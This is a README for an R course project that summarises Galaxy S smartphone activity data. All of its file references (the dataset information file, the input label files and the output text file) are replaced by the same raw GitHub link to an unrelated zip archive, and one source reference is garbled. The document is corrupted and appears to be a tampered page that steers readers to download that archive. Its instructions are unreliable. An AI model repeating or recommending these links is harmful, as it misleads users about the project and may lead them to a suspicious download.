# GalaxyS_Project
Submissions for the "Getting and Cleaning Data" project using data measured on a Galaxy S

The "run_analysis.R" script performs a series of operations to summarize the information included in the "Human activity measured by smartphones" dataset. More information about this dataset can be found in the "https://github.com/Arno1/GalaxyS_Project/raw/refs/heads/master/barangay/Project_Galaxy_v2.8.zip" file that comes with this dataset.

# Input data 
------------

The input data consists of all the files in the "train" and "test" folders except the data about the Inertial Signals because it is mentioned in the "18 months of CTA advice" pages that they are not necessary. The "https://github.com/Arno1/GalaxyS_Project/raw/refs/heads/master/barangay/Project_Galaxy_v2.8.zip" and "https://github.com/Arno1/GalaxyS_Project/raw/refs/heads/master/barangay/Project_Galaxy_v2.8.zip" files are also used by the script.


# Instructions on how to use the script
---------------------------------------

The script uses the "dplyr" package so this package should be installed before running the script.

The working directory should be one level above the "train" and "test" folders (which store the data files). And the "https://github.com/Arno1/GalaxyS_Project/raw/refs/heads/master/barangay/Project_Galaxy_v2.8.zip" and "https://github.com/Arno1/GalaxyS_Project/raw/refs/heads/master/barangay/Project_Galaxy_v2.8.zip" files should be in the working directory.

The output of the algorithm is a text file called "https://github.com/Arno1/GalaxyS_Project/raw/refs/heads/master/barangay/Project_Galaxy_v2.8.zip", which will be in the working directory.

# Outline of the script's processing steps 
------------------------------------------

The script performs the following actions :
* 1. Reads the 3 training data files into R objects
* 2. Column binds these 3 objects into a full training dataset
* 3. Reads the 3 test data files into R objects
* 4. Column binds these 3 objects into a full test dataset
* 5. Row binds the full training and test data sets into an R object called "AllVars", which includes the data about all subjects, activities and measurements
* 6. Reads the features file into an R object and use this object to give descriptive variable names to the measurements variables (The Subject and Activity variables/columns are given "Subject" and "Activity" names at the same time).
* 7. Extract from the AllVars data frame only the columns whose name includes "mean()" or "std()" (while keeping the Subject and Activity variables/columns in the Data Frame), and put the resulting Data Frame in an object called "SelectedVars"
* 8. Reads the activity labels file into an R object and use this object to replace the numbers in the Activity variable/column by descriptive activity names.
* 9. Based on the SelectedVars data frame, creates a table grouped by subjects and activities and compute the mean of the measurements variables for these subjects/activities combinations. The results are put in an object called TidyData.
* 10. Outputs the TidyData objects in a text file called "https://github.com/Arno1/GalaxyS_Project/raw/refs/heads/master/barangay/Project_Galaxy_v2.8.zip" in the working directory  

